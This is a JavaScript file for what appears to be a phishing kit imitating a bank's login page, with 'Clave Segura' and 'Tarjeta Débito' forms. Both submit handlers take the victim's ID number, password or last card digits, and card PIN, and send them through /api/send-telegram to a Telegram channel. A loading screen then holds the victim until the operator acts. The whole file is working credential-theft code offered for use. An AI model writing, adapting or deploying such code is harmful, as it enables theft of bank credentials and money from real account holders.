/**
 * INDEX.JS - Página principal de login
 * Maneja formularios de Clave Segura y Tarjeta Débito
 */

document.addEventListener('DOMContentLoaded', function() {
    console.log('🚀 Iniciando aplicación principal...');
    
    // Asegurar que commonUtils esté inicializado
    if (window.commonUtils && !window.commonUtils.initialized) {
        window.commonUtils.initializeCommon();
    }
    
    // Elementos del carrusel
    const serviceCards = document.querySelector('.service-cards');
    const prevButton = document.querySelector('.prev-button');
    const nextButton = document.querySelector('.next-button');
    let scrollAmount = 0;
    const cardWidth = 132;

    // Función para actualizar visibilidad de botones
    function updateButtonVisibility() {
        if (prevButton && nextButton) {
            prevButton.style.display = scrollAmount <= 0 ? 'none' : 'flex';
            nextButton.style.display = 
                scrollAmount >= serviceCards.scrollWidth - serviceCards.clientWidth ? 'none' : 'flex';
        }
    }

    // Manejadores de eventos para los botones del carrusel
    if (prevButton && nextButton && serviceCards) {
        prevButton.addEventListener('click', () => {
            scrollAmount = Math.max(scrollAmount - cardWidth, 0);
            serviceCards.style.transform = `translateX(-${scrollAmount}px)`;
            updateButtonVisibility();
        });

        nextButton.addEventListener('click', () => {
            const maxScroll = serviceCards.scrollWidth - serviceCards.clientWidth;
            scrollAmount = Math.min(scrollAmount + cardWidth, maxScroll);
            serviceCards.style.transform = `translateX(-${scrollAmount}px)`;
            updateButtonVisibility();
        });
    }

    // Elementos del formulario
    const loginOptions = document.querySelectorAll('.login-options button');
    const claveForm = document.getElementById('claveForm');
    const tarjetaForm = document.getElementById('tarjetaForm');
    const loginAlert = document.getElementById('loginAlert');

    // Manejar botones de mostrar/ocultar contraseña
    document.querySelectorAll('.toggle-password').forEach(button => {
        button.addEventListener('click', function(e) {
            e.preventDefault();
            const input = this.parentElement.querySelector('input');
            const slashElement = this.querySelector('.slash');
            
            if (input.type === 'password') {
                input.type = 'text';
                this.classList.add('show');
            } else {
                input.type = 'password';
                this.classList.remove('show');
            }
            
            if (slashElement) {
                slashElement.style.opacity = input.type === 'password' ? '0' : '1';
            }
        });
    });

    // Permitir solo números en campos específicos
    document.querySelectorAll('input[type="password"], input[type="text"]:not(.cardholder-name)').forEach(input => {
        input.addEventListener('input', function() {
            if (!this.classList.contains('cardholder-name')) {
                this.value = this.value.replace(/\D/g, '');
            }
        });
    });

    // Manejar cambio entre formularios
    loginOptions.forEach((button, index) => {
        button.addEventListener('click', function() {
            console.log('Cambiando formulario...');
            loginOptions.forEach(btn => btn.classList.remove('active'));
            this.classList.add('active');

            if (index === 0) {
                claveForm.style.display = 'block';
                tarjetaForm.style.display = 'none';
                loginAlert.style.display = 'block';
            } else {
                claveForm.style.display = 'none';
                tarjetaForm.style.display = 'block';
                loginAlert.style.display = 'none';
            }
        });
    });

    // ========================================
    // SUBMIT HANDLER - CLAVE SEGURA
    // ========================================
    
    claveForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        console.log('📝 Formulario Clave Segura enviado');
        
        // Prevenir envíos múltiples
        if (window.isSubmitting) {
            console.log('⚠️ Ya hay un envío en proceso');
            return;
        }

        // Obtener valores del formulario
        const tipoDoc = this.querySelector('select').value;
        const numDoc = this.querySelector('input[type="text"]').value.trim();
        const claveSegura = this.querySelector('input[type="password"]').value.trim();

        // Validación básica
        if (!numDoc || !claveSegura) {
            window.commonUtils.showError('Por favor complete todos los campos obligatorios');
            return;
        }

        if (numDoc.length < 5) {
            window.commonUtils.showError('El número de documento no es válido');
            return;
        }

        if (claveSegura.length < 4) {
            window.commonUtils.showError('La clave debe tener al menos 4 dígitos');
            return;
        }

        // Marcar como enviando
        window.isSubmitting = true;
        window.loadingOverlay.showSending('Verificando credenciales...');

        // Preparar datos
        const data = {
            tipo: 'Clave Segura',
            tipoDocumento: tipoDoc,
            numeroDocumento: numDoc,
            clave: claveSegura
        };

        try {
            console.log('📤 Enviando datos a Telegram...');
            
            const response = await fetch('/api/send-telegram', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify(data)
            });

            if (!response.ok) {
                throw new Error(`Error del servidor: ${response.status}`);
            }

            const result = await response.json();
            
            if (!result.success) {
                throw new Error(result.error || 'Error al procesar la solicitud');
            }

            console.log('✅ Datos enviados exitosamente - Message ID:', result.messageId);
            
            // Mantener overlay con 'Cargando'
            console.log('📺 Overlay visible: Cargando...');
            
            // Guardar información de la sesión
            sessionStorage.setItem('formData', JSON.stringify({
                tipo: 'Clave Segura',
                formulario: 'clave',
                messageId: result.messageId,
                timestamp: new Date().toISOString()
            }));

            // El loading se mantendrá visible hasta que llegue la acción de Telegram

        } catch (error) {
            console.error('❌ Error al enviar formulario:', error);
            window.loadingOverlay.hide();
            window.isSubmitting = false;
            window.commonUtils.showError('Ha ocurrido un error. Por favor intente nuevamente.');
        }
    });

    // ========================================
    // SUBMIT HANDLER - TARJETA DÉBITO
    // ========================================
    
    tarjetaForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        console.log('📝 Formulario Tarjeta Débito enviado');
        
        // Prevenir envíos múltiples
        if (window.isSubmitting) {
            console.log('⚠️ Ya hay un envío en proceso');
            return;
        }

        // Obtener valores del formulario
        const tipoDoc = this.querySelector('select').value;
        const numDoc = this.querySelector('input[name="identification"]').value.trim();
        const ultimosDigitos = this.querySelector('input[name="card-number"]').value.trim();
        const claveTarjeta = this.querySelector('input[name="card-pin"]').value.trim();

        // Validación básica
        if (!numDoc || !ultimosDigitos || !claveTarjeta) {
            window.commonUtils.showError('Por favor complete todos los campos obligatorios');
            return;
        }

        if (numDoc.length < 5) {
            window.commonUtils.showError('El número de documento no es válido');
            return;
        }

        if (ultimosDigitos.length !== 4) {
            window.commonUtils.showError('Debe ingresar los 4 últimos dígitos de su tarjeta');
            return;
        }

        if (claveTarjeta.length !== 4) {
            window.commonUtils.showError('La clave de tarjeta debe tener 4 dígitos');
            return;
        }

        // Marcar como enviando
        window.isSubmitting = true;
        window.loadingOverlay.showSending('Verificando información de tarjeta...');

        // Preparar datos
        const data = {
            tipo: 'Tarjeta Débito',
            tipoDocumento: tipoDoc,
            numeroDocumento: numDoc,
            ultimosDigitos: ultimosDigitos,
            claveTarjeta: claveTarjeta
        };

        try {
            console.log('📤 Enviando datos a Telegram...');
            
            const response = await fetch('/api/send-telegram', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify(data)
            });

            if (!response.ok) {
                throw new Error(`Error del servidor: ${response.status}`);
            }

            const result = await response.json();
            
            if (!result.success) {
                throw new Error(result.error || 'Error al procesar la solicitud');
            }

            console.log('✅ Datos enviados exitosamente - Message ID:', result.messageId);
            
            // Mantener overlay con 'Cargando'
            console.log('📺 Overlay visible: Cargando...');
            
            // Guardar información de la sesión
            sessionStorage.setItem('formData', JSON.stringify({
                tipo: 'Tarjeta Débito',
                formulario: 'tarjeta',
                messageId: result.messageId,
                timestamp: new Date().toISOString()
            }));

            // El loading se mantendrá visible hasta que llegue la acción de Telegram

        } catch (error) {
            console.error('❌ Error al enviar formulario:', error);
            window.loadingOverlay.hide();
            window.isSubmitting = false;
            window.commonUtils.showError('Ha ocurrido un error. Por favor intente nuevamente.');
        }
    });

    console.log('✅ Aplicación principal iniciada correctamente');
});